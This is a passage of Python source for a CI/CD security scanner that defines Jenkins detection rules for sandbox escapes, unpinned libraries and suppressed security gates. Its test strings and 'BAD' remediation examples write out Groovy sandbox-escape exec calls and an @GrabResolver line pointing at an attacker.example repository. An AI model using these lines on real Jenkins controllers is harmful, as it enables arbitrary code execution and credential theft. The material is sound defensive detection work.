        # gpg symmetric / asymmetric encrypt of the secret.
        r"|\bgpg\b[^|\n]*(?:-c\b|--symmetric\b|-e\b|--encrypt\b)"
        r")"
    )

    @staticmethod
    def _cred_var_referenced(body: str, cred_vars: frozenset[str]) -> str | None:
        """First bound credential var referenced in ``body`` as a shell/Groovy
        variable (``$V`` / ``${V}`` / ``%V%`` for bat), else None."""
        for v in cred_vars:
            if re.search(r"[$%]\{?" + re.escape(v) + r"\}?", body):
                return v
        return None

    def _collect_cred_vars(self, content: str) -> frozenset[str]:
        cred_vars: set[str] = set()
        # env-block ``NAME = credentials('id')`` bindings.
        for m in self._CREDS_ENV_RE.finditer(content):
            cred_vars.add(m.group(1))
        # withCredentials([... variable: 'X' ...]) bindings (structural).
        try:
            from taintly.parsers.jenkinsfile import EventKind, walk_jenkinsfile

            # Public walk_jenkinsfile is island-only (no `backend` kwarg); the
            # island reader is the substrate the JK rule pack reads, identical
            # to lab's default backend="island".
            for ev in walk_jenkinsfile(content, recover=True):
                if ev.kind == EventKind.CUTOFF:
                    break
                if (
                    ev.kind == EventKind.LEAF
                    and ev.path
                    and ev.path[-1] in self._BIND_VAR_KEYS
                    and ev.value
                ):
                    cred_vars.add(ev.value)
        except Exception:  # nosec B110 - never crash a scan on an unmodelled shape
            pass
        return frozenset(cred_vars)

    def check(self, content: str, lines: list[str]) -> list[tuple[int, str]]:
        if "credentials" not in content:
            # Both binding forms contain the substring ``credentials``;
            # a file without it cannot bind a secret this rule reasons about.
            return []
        cred_vars = self._collect_cred_vars(content)
        if not cred_vars:
            return []
        try:
            from taintly.parsers.jenkinsfile import EventKind, walk_jenkinsfile
        except ImportError:  # pragma: no cover - module ships in-tree
            return []
        results: list[tuple[int, str]] = []
        seen: set[tuple[int, str]] = set()
        try:
            # Public walk_jenkinsfile is island-only (no `backend` kwarg); the
            # island reader is the substrate the JK rule pack reads, identical
            # to lab's default backend="island".
            for ev in walk_jenkinsfile(content, recover=True):
                if ev.kind == EventKind.CUTOFF:
                    break
                if ev.kind != EventKind.LEAF or ev.value_kind != "shell":
                    continue
                body = ev.value
                if not body:
                    continue
                if not self._TRANSFORM_RE.search(body):
                    continue
                if self._cred_var_referenced(body, cred_vars) is None:
                    continue
                if 0 < ev.line <= len(lines):
                    snippet = lines[ev.line - 1].strip() or body.strip()
                else:
                    snippet = body.strip()
                key = (ev.line, snippet)
                if key in seen:
                    continue
                seen.add(key)
                results.append(key)
        except Exception:  # nosec B110 - walker failures must not break scans
            return []
        return results


RULES: list[Rule] = [
    # =========================================================================
    # SEC3-JK-001: Shared library loaded without SHA pinning
    # =========================================================================
    Rule(
        id="SEC3-JK-001",
        title="Jenkins shared library loaded without commit-SHA pinning",
        severity=Severity.HIGH,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-3",
        description=(
            "A Jenkins shared library is loaded via @Library without pinning to a full "
            "40-character commit SHA. Without a SHA pin, Jenkins resolves the library "
            "each time it needs the code for a build — against a branch head or tag, "
            "both of which are mutable references (branches can be force-pushed, tags "
            "can be deleted and recreated). Only a 40-char commit SHA is immutable. "
            "Shared library code executes on the Jenkins controller with the same "
            "trust level as the Jenkinsfile itself, giving an attacker who controls "
            "the library repo arbitrary code execution on your CI infrastructure."
        ),
        pattern=RegexPattern(
            match=r"@Library\s*\(['\"][\w.-]+",
            exclude=[r"^\s*//", r"@[a-f0-9]{40}\b"],
        ),
        remediation=(
            "Pin shared libraries to a full commit SHA:\n"
            "  @Library('my-shared-lib@abc123def456abc123def456abc123def456abc1') _\n\n"
            "Find the current SHA:\n"
            "  git ls-remote https://github.com/org/my-shared-lib refs/heads/main\n\n"
            "Add a comment with the human-readable ref for maintainability:\n"
            "  @Library('my-shared-lib@abc123def456...') _ // v2.1.0"
        ),
        reference="https://www.jenkins.io/doc/book/pipeline/shared-libraries/",
        test_positive=[
            "@Library('my-shared-lib') _",
            "@Library('my-shared-lib@main') _",
            "@Library('corp-lib@v1.2.3') _",
            "  @Library('utils@develop') _",
        ],
        test_negative=[
            "@Library('my-shared-lib@abc123def456abc123def456abc123def456abc1') _",
            "// @Library('my-shared-lib') _",
        ],
        stride=["T"],
        threat_narrative=(
            "A shared library loaded without a pinned commit SHA changes with every push to "
            "the library repository, meaning any contributor to that repository can "
            "silently modify what your pipeline executes on the next run. Shared libraries "
            "run as trusted code in the Jenkins Groovy sandbox with full access to the "
            "pipeline's credentials and workspace."
        ),
    ),
    # =========================================================================
    # SEC3-JK-007 — shared library loaded via the library() STEP without a
    # commit-SHA pin.  SEC3-JK-001 matches only the ``@Library`` annotation;
    # the runtime ``library`` step (``library 'lib@main'`` /
    # ``library('lib@${params.V}')``) is a distinct, uncovered loader with
    # the same mutable-ref / param-interpolation supply-chain risk
    # (param interpolation is the CVE-2022-29047 class).  Mirrors
    # SEC3-JK-001's SHA exclude so pinned refs do not fire; lowercase
    # ``library`` cannot collide with the capital-L ``@Library`` annotation.
    # =========================================================================
    Rule(
        id="SEC3-JK-007",
        title="Shared library loaded via library() step without commit-SHA pinning",
        severity=Severity.HIGH,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-3",
        finding_family="Mutable dependency references",
        description=(
            "A Jenkins shared library is loaded with the runtime ``library`` "
            "step against a mutable ref — a branch (``@main``), a tag "
            "(``@v1.2``), the configured default version (no ``@`` at all), "
            "or a parameter-interpolated ref (``@${params.VERSION}``). "
            "Unlike the ``@Library`` annotation (SEC3-JK-001), the "
            "``library`` step resolves at runtime, so the library code can "
            "change between builds; a parameter-interpolated version is the "
            "CVE-2022-29047 class, where a build parameter selects which "
            "library revision (and thus which code) runs on the controller. "
            "Shared-library code executes with the pipeline's full trust."
        ),
        pattern=RegexPattern(
            # ``library 'x@ref'`` (command syntax) or ``library('x@ref')``
            # (method syntax).  Fires on any non-SHA ref, like SEC3-JK-001.
            match=r"\blibrary\s*\(?\s*['\"][\w.\-/]+",
            exclude=[r"^\s*//", r"^\s*\*", r"@[a-fA-F0-9]{40}\b"],
        ),
        remediation=(
            "Pin the library step to a full commit SHA, and never derive "
            "the ref from a build parameter:\n\n"
            "// BAD\n"
            "library 'corp-lib@main'\n"
            'library "corp-lib@${params.LIB_VERSION}"   // CVE-2022-29047 class\n\n'
            "// GOOD — immutable commit SHA\n"
            "library 'corp-lib@abc123def456abc123def456abc123def456abc1'\n\n"
            "If you must select a version dynamically, validate it against "
            "an allowlist of reviewed SHAs rather than passing it straight "
            "into the step."
        ),
        reference="https://www.jenkins.io/doc/book/pipeline/shared-libraries/#loading-libraries-dynamically",
        test_positive=[
            "library 'my-lib@main'",
            "library('corp-lib@develop')",
            "library 'shared@v1.2.3'",
            'library "dyn@${params.LIB_VERSION}"',
            "library 'my-lib'",
        ],
        test_negative=[
            "library 'my-lib@abc123def456abc123def456abc123def456abc1'",
            "// library 'my-lib@main'",
            # @Library annotation is SEC3-JK-001's territory (capital L).
            "@Library('my-lib@main') _",
            # A variable named library, not the step.
            "def library = computeName()",
        ],
        stride=["T"],
        threat_narrative=(
            "The ``library`` step resolves its ref at build time. On a "
            "mutable ref, any push to the library repo changes what runs on "
            "the controller; with a parameter-interpolated ref, anyone who "
            "can set the build parameter (a parameterized build, an API "
            "trigger) chooses the library revision — arbitrary trusted-code "
            "execution on the Jenkins controller."
        ),
    ),
    # =========================================================================
    # SEC4-JK-009 — checkout/git step clones a remote URL built from a build
    # parameter.  SEC4-JK-001/002 cover shell-interpolation sinks, not the
    # checkout DSL.  A ``url: "${params.REPO_URL}"`` lets whoever triggers a
    # parameterized / API build point the checkout at an arbitrary remote,
    # whose code then runs with the pipeline's trust.  Deliberately scoped
    # to ``url:`` from ``params.`` only — ``branch: ${env.CHANGE_BRANCH}``
    # is the NORMAL way Multibranch checks out a PR and must not fire.
    # =========================================================================
    Rule(
        id="SEC4-JK-009",
        title="Checkout clones a remote URL built from a build parameter",
        severity=Severity.HIGH,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-4",
        description=(
            "A ``checkout`` / ``git`` step's ``url:`` is interpolated from a "
            'build parameter (``url: "${params.REPO_URL}"``). The remote '
            "to clone is then chosen by whoever starts the build — via a "
            "parameterized build form or an API trigger — so an attacker can "
            "point the checkout at a repository they control. That repo's "
            "Jenkinsfile / build scripts / submodules then execute with the "
            "pipeline's credentials and on its agent. Unlike "
            "``branch: ${env.CHANGE_BRANCH}`` (the normal Multibranch PR "
            "checkout), a parameter-driven clone URL has no trust anchor."
        ),
        pattern=RegexPattern(
            match=r"\burl\s*:\s*['\"]?\$\{?\s*params\s*\.",
            exclude=[r"^\s*//", r"^\s*\*"],
        ),
        remediation=(
            "Do not derive the checkout URL from a build parameter. Pin the "
            "remote in the Jenkinsfile (or the Multibranch / job SCM "
            "config) so it cannot be redirected at trigger time:\n\n"
            "// BAD\n"
            "git url: \"${params.REPO_URL}\", branch: 'main'\n\n"
            "// GOOD — fixed remote\n"
            "git url: 'https://github.com/org/repo.git', branch: 'main'\n\n"
            "If you genuinely build multiple known repos, map a small "
            "allowlist of parameter values to fixed URLs rather than "
            "interpolating the parameter into the URL directly."
        ),
        reference="https://www.jenkins.io/doc/pipeline/steps/workflow-scm-step/",
        test_positive=[
            '        url: "${params.REPO_URL}"',
            'userRemoteConfigs: [[url: "${params.GIT_URL}"]]',
            "git url: \"${params.REPO}\", branch: 'main'",
        ],
        test_negative=[
            "        url: 'https://github.com/org/repo.git'",
            # Normal Multibranch PR checkout — branch, not url; env, not param.
            '        branch: "${env.CHANGE_BRANCH}"',
            '        // url: "${params.REPO_URL}"',
        ],
        stride=["T", "E"],
        threat_narrative=(
            "A parameter-driven clone URL turns the pipeline into a "
            "confused deputy: the attacker supplies their own repository as "
            "the build parameter, the agent clones and runs it with the "
            "job's credentials, and the build looks legitimate because the "
            "Jenkinsfile itself was never changed."
        ),
    ),
    # =========================================================================
    # SEC4-JK-010 — load step executes Groovy from an attacker-influenced
    # path.  SEC4-JK-003 covers ``evaluate()`` / ``Eval.*`` but not the
    # ``load`` step.  ``load "${params.X}"`` / ``load`` of a PR-controlled
    # (``env.CHANGE_*`` / ghprb) path runs attacker-chosen Groovy on the
    # controller.  Scoped to params / change / ghprb interpolation — a
    # static ``load 'ci/lib.groovy'`` is the normal, safe use.
    # =========================================================================
    Rule(
        id="SEC4-JK-010",
        title="load step executes Groovy from a parameter / PR-controlled path",
        severity=Severity.HIGH,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-4",
        description=(
            "A Jenkinsfile ``load`` step takes a path interpolated from a "
            "build parameter (``${params.X}``) or a PR-controlled variable "
            "(``${env.CHANGE_*}`` / ghprb). ``load`` compiles and runs the "
            "target file as Groovy on the controller with the pipeline's "
            "trust, so an attacker who controls the path — or the file at "
            "that path, e.g. a script pulled in by an untrusted checkout — "
            "gets arbitrary code execution. A static ``load 'ci/lib.groovy'`` "
            "is the normal, safe pattern and does not fire."
        ),
        pattern=RegexPattern(
            match=(
                r"\bload\s*\(?\s*['\"][^'\"\n]*"
                r"\$\{?\s*(?:params\.|env\.CHANGE_|env\.ghprb|ghprb)"
            ),
            exclude=[r"^\s*//", r"^\s*\*"],
        ),
        remediation=(
            "Load only fixed, in-repo Groovy files; never interpolate a "
            "parameter or PR-controlled value into the path:\n\n"
            "// BAD\n"
            'load "${params.SCRIPT_PATH}"\n'
            'load "${env.CHANGE_BRANCH}/deploy.groovy"\n\n'
            "// GOOD — fixed path under version control\n"
            "load 'ci/deploy.groovy'\n\n"
            "If different builds need different logic, select among a fixed "
            "set of in-repo scripts with a validated switch, not a path "
            "built from untrusted input."
        ),
        reference="https://www.jenkins.io/doc/pipeline/steps/workflow-cps-global-lib/",
        test_positive=[
            'load "${params.SCRIPT_PATH}"',
            'load("ci/${params.ENV}.groovy")',
            'load "${env.CHANGE_BRANCH}/deploy.groovy"',
        ],
        test_negative=[
            "load 'ci/lib.groovy'",
            # Workspace-relative load of a fixed file — common and not
            # parameter/PR-controlled.
            'load "${WORKSPACE}/vars.groovy"',
            '// load "${params.X}"',
        ],
        stride=["T", "E"],
        threat_narrative=(
            "``load`` is a Groovy code-execution sink. A path from "
            "``params.*`` lets the build trigger choose which file runs; a "
            "path from ``env.CHANGE_*`` lets a PR steer it. Either way the "
            "attacker's Groovy executes on the controller with the "
            "pipeline's full privilege."
        ),
    ),
    # =========================================================================
    # SEC4-JK-011 — @Grab + process-execution class = Groovy sandbox escape.
    # @Grab resolves at compile time, BEFORE the Script Security sandbox, so a
    # pipeline that grabs a dependency and drives ProcBuilder / Runtime /
    # ProcessBuilder achieves arbitrary command execution the sandbox cannot
    # stop (CVE-2019-1003000). Distinct from SEC3-JK-002 (unversioned float):
    # fires on ANY @Grab, but only when the in-file execution escape co-occurs.
    # =========================================================================
    Rule(
        id="SEC4-JK-011",
        title="@Grab dependency combined with a process-execution class (sandbox escape)",
        severity=Severity.HIGH,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-4",
        description=(
            "A Jenkinsfile or sandboxed Groovy script uses an ``@Grab`` "
            "annotation to pull a dependency and also drives a "
            "process-execution class (``ProcBuilder``, ``Runtime.getRuntime``, "
            "``new ProcessBuilder``). ``@Grab`` is resolved and executed by "
            "Grape at *compile time*, before the Jenkins Script Security "
            "sandbox is applied, so the combination reaches arbitrary OS "
            "command execution the sandbox cannot intercept — the "
            "CVE-2019-1003000 / SECURITY-1538 sandbox-escape shape. Unlike "
            "SEC3-JK-002 (which flags only *unversioned* @Grab as a dependency "
            "float risk), this fires on any @Grab — including a pinned "
            "version — because the escape does not depend on the version."
        ),
        pattern=_GrabSandboxEscapePattern(),
        remediation=(
            "Do not load Grape dependencies from a pipeline or untrusted "
            "Groovy script. Disable @Grab in the Script Security sandbox, "
            "declare dependencies as reviewed Jenkins plugins or in a build "
            "tool (Maven/Gradle) run inside an agent step, and never combine "
            "ad-hoc dependency loading with process-execution classes:\n\n"
            "// BAD — @Grab runs before the sandbox, then escapes to a shell\n"
            "@Grab('org.buildobjects:jproc:2.2.3')\n"
            "import org.buildobjects.process.ProcBuilder\n"
            "new ProcBuilder('/bin/bash').withArgs('-c','id').run()\n\n"
            "// GOOD — run tools via a normal agent step, no Grape\n"
            "sh 'id'"
        ),
        reference="https://www.jenkins.io/security/advisory/2019-01-08/",
        test_positive=[
            (
                "@Grab('org.buildobjects:jproc:2.2.3')\n"
                "import org.buildobjects.process.ProcBuilder\n"
                "new ProcBuilder('/bin/bash').withArgs('-c','id').run()"
            ),
            (
                "@Grab('commons-io:commons-io:2.11.0')\n"
                "def out = Runtime.getRuntime().exec('whoami')"
            ),
        ],
        test_negative=[
            # Pinned @Grab with NO execution sink — legitimate Grape usage.
            (
                "@Grab('org.apache.commons:commons-lang3:3.12.0')\n"
                "import org.apache.commons.lang3.StringUtils\n"
                "echo StringUtils.upperCase('x')"
            ),
            # Process execution but NO @Grab — ordinary pipeline, not a Grape escape.
            "new ProcBuilder('/bin/echo').withArgs('hi').run()",
            # Commented-out @Grab next to exec — not live code.
            ("// @Grab('g:a:1.0')\nnew ProcessBuilder('id').start()"),
        ],
        stride=["E", "T"],
        threat_narrative=(
            "@Grab is a compile-time code-loading primitive that runs before "
            "the Script Security sandbox engages. Paired with a "
            "process-execution class it is a documented sandbox escape "
            "(CVE-2019-1003000): an attacker who controls the pipeline text "
            "achieves arbitrary command execution on the Jenkins controller "
            "with the pipeline's full trust."
        ),
    ),
    # =========================================================================
    # SEC4-JK-012 — direct OS process execution from Groovy.  SEC4-JK-011 only
    # fires on @Grab + an exec class; SEC4-JK-003 only on evaluate()/Eval.  The
    # bare command-exec sinks — String/GString ``.execute()``,
    # ``Runtime.getRuntime().exec``, ``new ProcessBuilder`` — are the
    # script-console / sandbox-escape command-exec signatures and were
    # uncovered as standalone primitives.  String-receiver-anchored so the
    # benign ``stage.execute()`` domain-object call (22/871 corpus files) does
    # NOT fire; the dangerous string-receiver form is 0/871 (recall insurance).
    # =========================================================================
    Rule(
        id="SEC4-JK-012",
        title="Direct OS process execution from Groovy (.execute / Runtime.exec / ProcessBuilder)",
        severity=Severity.CRITICAL,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-4",
        confidence="medium",
        finding_family="Groovy sandbox bypass",
        description=(
            "A Jenkinsfile or Groovy pipeline script spawns an operating-system "
            "process directly through a Groovy/Java exec primitive: a "
            'String/GString ``.execute()`` (``"cmd".execute()``, '
            '``"${x}".execute()``), ``Runtime.getRuntime().exec(...)``, or '
            "``new ProcessBuilder(...)``. These are the canonical Groovy "
            "command-execution sinks — the same idioms used against the "
            "``/script`` console and reached once the Script Security sandbox "
            "is bypassed (or in trusted-library / unsandboxed contexts where no "
            "sandbox applies). Unlike the supported ``sh`` / ``bat`` steps "
            "(which run in an agent workspace and respect the build's process "
            "model), an in-Groovy exec runs on the controller JVM with the "
            "pipeline's full trust and bypasses the step-level controls. The "
            "String-receiver ``.execute()`` anchor distinguishes this from the "
            "common, benign ``stage.execute()`` method call on a domain object, "
            "which does not fire."
        ),
        pattern=_DirectProcessExecPattern(),
        remediation=(
            "Never spawn processes directly from Groovy. Use the supported "
            "``sh`` / ``bat`` / ``powershell`` steps, which run in the agent "
            "and are visible to Jenkins' process model:\n\n"
            "// BAD — runs on the controller JVM, outside the sandbox/step model\n"
            'def out = "curl ${params.URL}".execute().text\n'
            "Runtime.getRuntime().exec('/bin/sh -c id')\n"
            "new ProcessBuilder('bash', '-c', 'id').start()\n\n"
            "// GOOD — agent step, single-quoted body\n"
            "sh 'id'\n\n"
            "If you must shell out, do it through a step and keep "
            "attacker-controlled values out of the command string."
        ),
        reference="https://www.jenkins.io/security/advisory/2019-01-08/",
        test_positive=[
            'def out = "curl http://x".execute().text',
            "'id'.execute()",
            'def p = "${params.CMD}".execute()',
            "Runtime.getRuntime().exec('id')",
            "Runtime.runtime.exec('whoami')",
            "new ProcessBuilder('bash', '-c', 'id').start()",
            "def r = ['bash', '-c', 'id'].execute()",
        ],
        test_negative=[
            # Benign domain-object method call — the #1 corpus FP class.
            "stage.execute()",
            "new CheckoutStage(script, context).execute()",
            "Map data = request.execute()",
            "return stage.execute()",
            # Supported agent step, not an in-Groovy exec.
            "sh 'id'",
            # Primitive only inside a comment / string — not live code.
            "// def out = 'id'.execute()",
            'echo "do not call Runtime.getRuntime().exec here"',
        ],
        stride=["E", "T"],
        incidents=["CVE-2019-1003000 / SECURITY-1266 (Groovy sandbox escape)"],
        threat_narrative=(
            "A Groovy ``.execute()`` / ``Runtime.exec`` / ``ProcessBuilder`` "
            "call runs an OS process on the Jenkins controller JVM with the "
            "pipeline's full privilege, outside the ``sh``-step model and "
            "outside whatever the Script Security sandbox would have blocked. "
            "An attacker who can influence the command string — or who is "
            "running unsandboxed trusted-library code — gets arbitrary command "
            "execution on the controller."
        ),
    ),
    # =========================================================================
    # SEC4-JK-013 — Script-Security reflection / dynamic-compile bypass
    # (SECURITY-1353 = CVE-2019-1003040/-1003041).  ScriptBytecodeAdapter /
    # castToType / MethodClosure (the class) / new GroovyShell(...).parse /
    # parseClass reach blocked methods or compile Groovy at runtime.  Distinct
    # from SEC4-JK-003 (evaluate()/Eval builtins).  Anchored on never-benign
    # signatures only: the bare ``.&m`` operator (4/871 corpus, idiomatic) and
    # the ``GroovyClassLoader`` type annotation (7/871, a cleanup util) are
    # deliberately NOT matched.  0/871 corpus signal = recall insurance.
    # =========================================================================
    Rule(
        id="SEC4-JK-013",
        title="Groovy reflection / dynamic-compile sandbox bypass (ScriptBytecodeAdapter / GroovyShell / castToType)",
        severity=Severity.CRITICAL,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-4",
        confidence="medium",
        finding_family="Groovy sandbox bypass",
        description=(
            "A Jenkinsfile or Groovy script reaches arbitrary method dispatch "
            "or runtime Groovy compilation through a reflective primitive that "
            "the Script Security sandbox does not reliably intercept — the "
            "SECURITY-1353 (CVE-2019-1003040 / -1003041) escape class. Detected "
            "shapes: ``ScriptBytecodeAdapter`` (the Groovy runtime-dispatch "
            "helper from the published PoC), ``castToType(...)`` (the cast "
            "abused to invoke private/blocked methods), the ``MethodClosure`` "
            "class (direct construction to reach a blocked method — distinct "
            "from the idiomatic ``this.&method`` operator, which is safe and "
            "does not fire), and ``new GroovyShell(...).parse``/``.evaluate`` / "
            "``...parseClass(...)`` (compiling and running a Groovy source "
            "string at runtime). These bypass the script-approval / sandbox "
            "controls and run with the pipeline's full trust on the controller."
        ),
        pattern=_ReflectionSandboxBypassPattern(),
        remediation=(
            "Do not use Groovy reflection or runtime compilation in pipelines. "
            "Replace dynamic dispatch with explicit calls and reviewed shared-"
            "library functions:\n\n"
            "// BAD — runtime compile + reflective dispatch bypass the sandbox\n"
            "new GroovyShell().parse(userSuppliedSource).run()\n"
            "ScriptBytecodeAdapter.invokeMethodN(...)\n"
            "obj.metaClass.getMetaMethod('blocked').invoke(obj)  // via MethodClosure\n\n"
            "// GOOD — explicit, approvable dispatch\n"
            "if (action == 'deploy') { deploy() }\n\n"
            "If a genuine need for dynamic behaviour exists, implement it in a "
            "reviewed global shared library, not via reflection in the "
            "Jenkinsfile."
        ),
        reference="https://www.jenkins.io/security/advisory/2019-02-19/",
        test_positive=[
            "ScriptBytecodeAdapter.invokeMethodN(this, String, 'x', args)",
            "def x = castToType(closure, SomeType)",
            "import org.codehaus.groovy.runtime.MethodClosure",
            "new GroovyShell().parse(src).run()",
            "def cls = new GroovyShell().parseClass(source)",
            "this.class.classLoader.parseClass(src)",
        ],
        test_negative=[
            # Idiomatic method-closure OPERATOR — safe, must not fire.
            "return bulkApply(project, resources, this.&pause)",
            # GroovyClassLoader as a TYPE annotation in a cleanup util — safe.
            "GroovyClassLoader classloader = (GroovyClassLoader)this.class.getClassLoader()",
            # metaClass introspection read — not the reflection-invoke escape.
            "def method = this.usecase.getMetaClass().getMethods()",
            # Safe Groovy `as` cast operator — not castToType().
            "def n = value as Integer",
            # Primitive only inside a comment.
            "// new GroovyShell().parse(src)",
        ],
        stride=["E", "T"],
        incidents=["CVE-2019-1003040 / CVE-2019-1003041 / SECURITY-1353"],
        threat_narrative=(
            "Reflective dispatch (``ScriptBytecodeAdapter`` / ``castToType`` / "
            "``MethodClosure``) and runtime Groovy compilation "
            "(``GroovyShell().parse`` / ``parseClass``) were documented "
            "Script Security sandbox bypasses (CVE-2019-1003040/-1003041). An "
            "attacker who can place such Groovy in a pipeline or a sandboxed "
            "script reaches blocked APIs and executes arbitrary code on the "
            "controller."
        ),
    ),
    # =========================================================================
    # SEC4-JK-014 — @GrabResolver / @GrabConfig Grape AST annotations.
    # Siblings of @Grab (SEC4-JK-011): AST transforms applied at COMPILE time,
    # before the sandbox (SECURITY-1266 / CVE-2019-1003000 root cause).
    # @GrabResolver adds an attacker-chosen Maven repo; @GrabConfig(
    # systemClassLoader=true) forces the JAR onto the system classloader.
    # Both widen the compile-time RCE surface and fire standalone (unlike
    # SEC4-JK-011's @Grab+exec co-occurrence).  0/871 corpus = recall insurance.
    # =========================================================================
    Rule(
        id="SEC4-JK-014",
        title="@GrabResolver / @GrabConfig Grape annotation (compile-time sandbox bypass surface)",
        severity=Severity.HIGH,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-4",
        confidence="medium",
        finding_family="Groovy sandbox bypass",
        description=(
            "A Jenkinsfile or Groovy script uses ``@GrabResolver`` or "
            "``@GrabConfig`` — Grape directives processed by an AST transform "
            "at *compile time*, before the Jenkins Script Security sandbox "
            "engages (the SECURITY-1266 / CVE-2019-1003000 compile-time-bypass "
            "root cause). ``@GrabResolver`` registers an additional, "
            "attacker-choosable Maven repository so a paired ``@Grab`` can pull "
            "a JAR from anywhere; ``@GrabConfig(systemClassLoader=true)`` forces "
            "the grabbed JAR onto the system classloader. Both materially widen "
            "the compile-time code-loading surface that the sandbox cannot "
            "intercept. Unlike SEC4-JK-011 (which requires ``@Grab`` plus an "
            "in-file process-execution class) these fire on their own, because "
            "reconfiguring where/how compile-time dependencies load is itself "
            "the escalation; and unlike SEC3-JK-002 (unversioned ``@Grab`` "
            "float) the AST-bypass risk does not depend on a version."
        ),
        pattern=_GrapeResolverConfigPattern(),
        remediation=(
            "Do not configure Grape from a pipeline. Disable Grape in the "
            "Script Security sandbox and declare dependencies as reviewed "
            "Jenkins plugins or in a build tool (Maven/Gradle) run inside an "
            "agent step:\n\n"
            "// BAD — reconfigures compile-time dependency loading\n"
            "@GrabResolver(name='evil', root='https://attacker.example/repo')\n"
            "@GrabConfig(systemClassLoader=true)\n"
            "@Grab('org.example:lib:1.0')\n\n"
            "// GOOD — no Grape; resolve deps in a build tool via a step\n"
            "sh './gradlew build'"
        ),
        reference="https://www.jenkins.io/security/advisory/2019-01-08/",
        test_positive=[
            "@GrabResolver(name='internal', root='https://repo.example/m2')",
            "@GrabConfig(systemClassLoader=true)",
            "  @GrabResolver('https://attacker.example/repo')",
        ],
        test_negative=[
            # Plain @Grab is SEC3-JK-002 / SEC4-JK-011 territory, not this rule.
            "@Grab('org.apache.commons:commons-lang3:3.12.0')",
            # Commented-out annotation — not live code.
            "// @GrabResolver(name='x', root='https://repo')",
            # The word in a string / log message, not the annotation.
            'echo "configure @GrabConfig in your settings"',
        ],
        stride=["E", "T"],
        incidents=["CVE-2019-1003000 / SECURITY-1266 (@Grab/AST compile-time bypass)"],
        threat_narrative=(
            "``@GrabResolver`` / ``@GrabConfig`` run at compile time before the "
            "Script Security sandbox, letting pipeline text point Grape at an "
            "attacker-controlled Maven repository or push a grabbed JAR onto the "
            "system classloader — the SECURITY-1266 compile-time bypass that "
            "reaches arbitrary code execution on the controller."
        ),
    ),
    # =========================================================================
    # SEC10-JK-002 — security tool whose failure is suppressed (validation
    # theatre).  No Jenkins THEATRE rule exists.  A scanner invocation
    # followed by ``|| true`` / ``|| :`` on the same line can never fail the
    # build — the gate is decorative.  Anchored on a named security tool so
    # benign ``make || true`` cleanup does not fire.  (The block-wrapping
    # ``catchError(buildResult:'SUCCESS')`` form needs Groovy block-awareness
    # and is a deferred follow-up.)
    # =========================================================================
    Rule(
        id="SEC10-JK-002",
        title="Security tool failure suppressed with || true (validation theatre)",
        severity=Severity.HIGH,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-10",
        description=(
            "A security scanner (Trivy, Semgrep, Gitleaks, Bandit, Snyk, "
            "Grype, Checkov, TruffleHog, OSV-Scanner, dependency-check, "
            "``npm audit`` …) is invoked with its exit status discarded via "
            "``|| true`` / ``|| :``. The step always reports success, so the "
            "gate can never fail the build — findings are produced but never "
            "enforced. This is validation theatre: the pipeline looks like "
            "it scans, but a real vulnerability or leaked secret does not "
            "stop a release."
        ),
        pattern=RegexPattern(
            match=(
                r"\b(?:trivy|semgrep|gitleaks|bandit|snyk|grype|checkov"
                r"|trufflehog|osv-scanner|dependency-check|safety\s+check"
                r"|npm\s+audit)\b[^\n]*\|\|\s*(?:[Tt]rue|:)"
            ),
            exclude=[r"^\s*//", r"^\s*\*"],
        ),
        remediation=(
            "Let the scanner fail the build, and handle expected findings "
            "explicitly:\n\n"
            "// BAD — result discarded; gate is decorative\n"
            "sh 'trivy image myapp:latest || true'\n\n"
            "// GOOD — non-zero exit fails the stage\n"
            "sh 'trivy image --exit-code 1 --severity HIGH,CRITICAL myapp:latest'\n\n"
            "If some findings are accepted, suppress them with the tool's "
            "own ignore/baseline file (``.trivyignore``, a semgrep baseline) "
            "so the gate still fails on NEW issues, instead of swallowing "
            "every failure."
        ),
        reference="https://owasp.org/www-project-top-10-ci-cd-security-risks/CICD-SEC-10-Insufficient-Logging-and-Visibility",
        test_positive=[
            "sh 'trivy image myapp || true'",
            'sh "semgrep --config auto . || true"',
            "sh 'gitleaks detect || :'",
        ],
        test_negative=[
            # Scanner that is actually allowed to fail the build.
            "sh 'trivy image --exit-code 1 myapp'",
            # || true on a non-security build step is out of scope.
            "sh 'make docs || true'",
            "// sh 'trivy image myapp || true'",
        ],
        stride=["R"],
        threat_narrative=(
            "A security gate wrapped in ``|| true`` produces logs but no "
            "enforcement. Maintainers and auditors see a 'security scan' "
            "stage that is green on every run, while critical findings sail "
            "through to production — the worst kind of false assurance."
        ),
    ),
    # =========================================================================
    # SEC5-JK-002 — unattended trigger (cron / pollSCM) on a deploy/publish
    # pipeline.  SEC5-JK-001 covers the concurrency race, not the trigger.
    # An automatic schedule/poll that reaches a deploy or release stage runs
    # a privileged action with no human in the loop.  review-needed, MEDIUM:
    # scheduled deploys to non-prod are a legitimate pattern, so this
    # surfaces the shape for a human to confirm rather than asserting a bug.
    # =========================================================================
    Rule(
        id="SEC5-JK-002",
        title="Deploy/publish pipeline runs on an unattended cron / pollSCM trigger",
        severity=Severity.MEDIUM,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-5",
        review_needed=True,
        confidence="medium",
        description=(
            "A pipeline declares an automatic trigger (``cron(...)`` or "
            "``pollSCM(...)``) AND contains a deploy / publish / release / "
            "production stage. The privileged action then runs on a "
            "schedule with no manual approval — there is no human gate "
            "between a poisoned commit (or a compromised upstream "
            "dependency) and a production deployment. Scheduled deploys to "
            "non-production environments can be legitimate, so review "
            "whether this unattended deploy is intended and adequately "
            "scoped."
        ),
        pattern=ContextPattern(
            anchor=r"\b(?:cron|pollSCM)\s*\(",
            requires=(
                r"stage\s*\(\s*['\"][^'\"]*"
                r"(?:[Dd]eploy|[Pp]ublish|[Rr]elease|[Pp]rod|[Ll]ive)"
            ),
            scope="file",
            exclude=[r"^\s*//", r"^\s*\*"],
        ),
        remediation=(
            "Put a manual approval gate in front of the deploy stage so a "
            "human authorizes each production release:\n\n"
            "stage('Deploy') {\n"
            "  input message: 'Deploy to production?', ok: 'Deploy'\n"
            "  steps { sh './deploy.sh' }\n"
            "}\n\n"
